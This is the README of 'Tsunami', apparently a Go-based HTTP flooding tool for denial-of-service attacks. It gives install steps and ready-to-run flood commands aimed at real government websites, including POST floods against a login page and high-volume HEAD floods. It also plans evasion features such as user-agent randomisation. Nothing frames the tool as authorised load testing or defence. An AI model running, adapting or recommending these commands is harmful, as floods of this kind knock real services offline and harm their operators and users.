# Tsunami
Tsunami is an advanced HTTP flooder written in Golang. It's currently implemented features include:

- Live attack stats
- Customizable mutlithreading
- HTTPS support __(Note: Certificates aren't verified for performance)__

__This project is huge WIP__

## Basic Usage
```bash
./tsunami http://whitehouse.gov --threads 100
```

## Help
```bash
./tsunami --help
```

## Quick install
```bash
git clone https://github.com/ammario/tsunami
cd tsunami
export GOPATH=`pwd`
go get ./...
go build
```

## Examples
### Low Volume POST Flood Lasting Forever
```bash
./tsunami -w 2 "https://fbi.gov/login" POST "username=Ammar&password=g1thuB123"
```
### High Volume HEAD Flood Lasting For 10 Minutes
```bash
./tsunami -w 100 -s 600 "https://cia.gov/" HEAD
```

## Todo
 - Dynamic tokens (E.g {RANDOM_STRING}, {RANDOM_INT})
 - User Agent randomization
 - Custom headers
 - Pretty display of attack stats
 - ???